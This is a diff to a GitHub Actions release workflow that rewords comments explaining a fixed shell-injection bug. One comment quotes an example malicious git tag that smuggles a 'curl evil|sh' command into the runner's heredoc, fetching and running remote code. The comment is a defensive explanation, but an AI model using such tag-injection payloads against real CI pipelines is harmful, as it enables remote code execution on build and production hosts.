@@ -568,9 +568,14 @@ jobs:
           # shell never re-parses (#933).
           RELEASE_TAG: ${{ github.event.release.tag_name }}
         run: |
+          # NOTE: this is the `run` script, not a YAML comment — GitHub parses
+          # workflow expressions anywhere in here, so an empty one written out
+          # literally is a syntax error that invalidates the whole file. Say
+          # "expression" in prose; never spell the delimiters below this line.
+          #
           # The release tag is attacker-influenced: git ref names may legally
-          # contain ';', '$( )', backticks and pipes, and `${{ }}` is substituted
-          # by the runner BEFORE this heredoc is written. A tag like
+          # contain ';', '$( )', backticks and pipes, and a workflow expression
+          # is substituted by the runner BEFORE this heredoc is written. A tag like
           #     v1.0.0";curl evil|sh;"
           # therefore ran attacker shell on the runner and on the production
           # host — repo write access escalating to production RCE (#933).
